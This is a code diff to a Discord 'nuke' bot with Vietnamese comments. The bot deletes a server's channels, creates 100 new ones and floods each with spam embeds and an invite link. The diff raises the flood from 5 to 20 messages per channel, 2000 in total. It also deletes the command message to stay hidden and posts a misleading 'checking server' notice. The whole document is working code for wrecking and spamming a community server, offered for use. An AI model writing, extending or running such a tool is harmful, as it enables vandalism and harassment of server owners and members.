@@ -192,7 +192,6 @@ class NukeConfirmView(discord.ui.View):
     @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
     async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_message("Đã xác nhận! Đang tiến hành...", ephemeral=True)
-        # Gửi thông báo kêu "từ từ đang check sever đã" ra kênh chat nơi gõ lệnh
         await self.channel.send("⚠️ Từ từ đang check sever đã...")
         
         for item in self.children:
@@ -263,6 +262,7 @@ async def execute_nuke(guild):
         if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
 
+        # Tạo ra 100 kênh mới để đạt tổng tiêu chuẩn 2000 tin nhắn (100 kênh x 20 tin nhắn)
         create_tasks = []
         for i in range(100):
             channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
@@ -278,11 +278,12 @@ async def execute_nuke(guild):
             ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
         )
         
+        # Mỗi kênh sẽ spam đúng 20 tin nhắn để tổng số lượng đạt 2000 tin nhắn toàn server
         spam_tasks = []
         for channel in created_channels:
             if isinstance(channel, discord.TextChannel):
                 async def spam_in_channel(ch=channel):
-                    for _ in range(5):
+                    for _ in range(20):
                         try:
                             embed = discord.Embed()
                             embed.set_image(url=NUKE_GIF_URL)
@@ -294,7 +295,7 @@ async def execute_nuke(guild):
         await asyncio.gather(*spam_tasks, return_exceptions=True)
 
         if log_channel:
-            await log_channel.send(embed=discord.Embed(title="✅ Nuke siêu tốc hoàn tất bởi Boss Bảo!", color=0x00FF00))
+            await log_channel.send(embed=discord.Embed(title="✅ Nuke siêu tốc (2000 tin nhắn) hoàn tất bởi Boss Bảo!", color=0x00FF00))
 
     except Exception as e:
         print(f"Lỗi khi thực hiện nuke: {e}")
@@ -305,7 +306,6 @@ async def execute_nuke(guild):
 async def nuke_server(ctx):
     """Lệnh nuke server: Bot sẽ gửi thư DM đến Boss Bảo để hỏi xác nhận."""
     try:
-        # Xóa tin nhắn gọi lệnh ở server để giữ kín đáo
         try:
             await ctx.message.delete()
         except:
@@ -314,9 +314,9 @@ async def nuke_server(ctx):
         confirm_embed = discord.Embed(
             title="🔴 🌈 **XÁC NHẬN LỆNH NUKE TỪ BOSS BẢO** 🌈 🔴",
             description=(
-                f"🔥 **Kính chào Boss Bảo!**\ Bạn đã yêu cầu nuke máy chủ: **{ctx.guild.name}** (`{ctx.guild.id}`)\n\n"
+                f"🔥 **Kính chào Boss Bảo!**\nBạn đã yêu cầu nuke máy chủ: **{ctx.guild.name}** (`{ctx.guild.id}`)\n\n"
                 f"Vui lòng kiểm tra kỹ và bấm nút bên dưới để quyết định:\n"
-                f"• 🟢 **Đồng ý:** Bot sẽ check server và tự động nuke ngay lập tức.\n"
+                f"• 🟢 **Đồng ý:** Bot sẽ check server và tiến hành xả 2000 tin nhắn (20 tin/kênh).\n"
                 f"• 🔴 **Từ chối:** Hủy bỏ lệnh và thông báo."
             ),
             color=0xFF0000
@@ -326,7 +326,6 @@ async def nuke_server(ctx):
         view = NukeConfirmView(ctx.guild, ctx.channel)
         await ctx.author.send(embed=confirm_embed, view=view)
         
-        # Báo cho Boss Bảo biết thư đã gửi qua DM
         temp_notice = await ctx.send("📩 **Boss Bảo check tin nhắn riêng (DM) để xác nhận lệnh nuke nhé!**")
         await asyncio.sleep(5)
         try:
